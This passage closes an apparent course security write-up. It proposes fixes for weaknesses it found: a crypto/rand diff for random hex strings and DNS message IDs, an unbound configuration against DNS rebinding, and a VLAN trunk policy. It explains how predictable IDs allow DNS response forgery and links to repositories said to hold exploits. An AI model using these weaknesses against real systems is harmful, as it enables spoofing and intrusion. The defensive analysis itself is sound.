> (pseudo-)random generator, as described in RFC4086. [RFC 5452 section 9.2](https://www.rfc-editor.org/rfc/rfc5452#section-9.2)

We propose removing `math/rand` in favor of `crypto/rand` because the CA's entropy source has no reason to be deterministic. An alternate implementation of `randHex` using `crypto/rand` could be a drop in replacement for the existing `randHex` function.

```go
- // randHex generates a random 32 character hex string
- func randHex() string {
- 	const letters = "0123456789abcdef"
- 	b := make([]byte, 32)
- 	for i := range b {
- 		b[i] = letters[rand.Intn(len(letters))]
- 	}
- 	return string(b)
- }
+ // randHex generates a secure random 32 character hex string
+ func randHex() string {
+ 	b := make([]byte, 16)
+ 	if _, err := rand.Read(b); err != nil {
+ 		panic(err)
+ 	}
+ 	return fmt.Sprintf("%x", b)
+ }
```

The `dnsChallenge` function used to make an outbound DNS query uses the `Intn` function from `math/rand` to generate a DNS message ID. This is similarly insecure because it enables the prediction of DNS message IDs and together with V-CA-02, effectively decreases entropy to make DNS response forgery possible. Replacing the use of `rand.Intn` with the `dns.Id` function mitigates this vulnerability by using a secure random source from `crypto/rand`.

```go
- m.Id = uint16(rand.Intn(65535))
+ m.Id = dns.Id()
```

The `dns` module uses `binary.Read` to read a uint16 from `crypto/rand`' `Reader` interface.

```go
// Id by default returns a 16-bit random number to be used as a message id. The
// number is drawn from a cryptographically secure random number generator.
// This being a variable the function can be reassigned to a custom function.
// For instance, to make it return a static value for testing:
//
//	dns.Id = func() uint16 { return 3 }
var Id = id

// id returns a 16 bits random number to be used as a
// message id. The random provided should be good enough.
func id() uint16 {
	var output uint16
	err := binary.Read(rand.Reader, binary.BigEndian, &output)
	if err != nil {
		panic("dns: reading random id failed: " + err.Error())
	}
	return output
}
```

*Source: github.com/miekg/dns@v1.1.50/msg.go*

### Mitigating V-NET-01: Internal information disclosure via DNS

Potentially sensitive internal information like the IP address of the internal key server should not be visible in public DNS records. We advise using a private, internal resolver for internal names, and refrain from entering private data in public DNS.

Furthermore, allowing private address space in public DNS is dangerous because it enables [DNS rebinding](https://unit42.paloaltonetworks.com/dns-rebinding/). We advise modifying the resolver's `unbound` configuration file to prohibit responding with private address space for DNS rebinding protection. This mitigation includes covering IPv4 loopback, link-local, and RFC 1918 shared private address space.

```
# Append to /etc/unbound/unbound.conf
private-address: 127.0.0.0/8
private-address: 10.0.0.0/8
private-address: 172.16.0.0/12
private-address: 169.254.0.0/16
private-address: 192.168.0.0/16
```

### Mitigating V-NET-02: Unprotected VLAN trunk ports

The VLAN between the API and key server is enabled on all VM virtual trunk ports, which allows an attacker to hop into the VLAN, therefore defeating any security that would be afforded by these ts being in an isolated network. We recommend using a managed virtual switch such as openvswitch with a secure trunk policy preventing 802.1Q tagged frames from being forwarded to any host except when originating from the key server or API.

## Appendix

All our source code is available under the [cs4404-mission1](https://github.com/cs4404-mission1) GitHub organization. The repositories are organized as follows:

**writeup** - This document

**cookie-monster** - Cookie decryption and prediction

**utilities** - Misc utilitites including `autovote.py`

**cs4404-voter-api** - Server for voter interface

**keyserver** - Server and exploit for key server

**ca** - Server and exploit for certificate authority
